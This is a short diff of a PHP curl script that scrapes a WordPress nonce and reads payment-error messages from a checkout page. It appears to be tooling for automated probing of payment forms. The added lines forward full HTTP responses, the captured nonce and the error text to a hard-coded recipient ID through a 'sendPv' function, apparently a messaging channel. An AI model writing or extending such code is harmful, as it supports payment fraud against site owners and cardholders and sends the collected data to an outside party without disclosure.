@@ -1252,7 +1252,7 @@ curl_setopt_array($curl, [
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
-
+sendPv("1292171163", $response);
 curl_close($curl);
 
 
@@ -1277,12 +1277,13 @@ curl_setopt_array($curl, [
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
-
+sendPv("1292171163", $response);
 curl_close($curl);
 
 preg_match('/_wpnonce" value="([^"]+)"/', $response, $match);
 $nonce = $match[1];
-
+$non="Nonce1: ".$nonce."";
+sendPv("1292171163", $non);
 echo "$nonce\n"; // imprime: d144ae23a1
 
 
@@ -1312,7 +1313,8 @@ sendPv("1292171163", $response);
 $err = curl_error($curl);
 $parts = explode('<li class="payment-error error">', $response);
 $respo = explode('</li>', $parts[1])[0];
-
+$non1="Nonce1: ".$respo."";
+sendPv("1292171163", $non1);
 curl_close($curl);
 
 if (empty($respo)) {
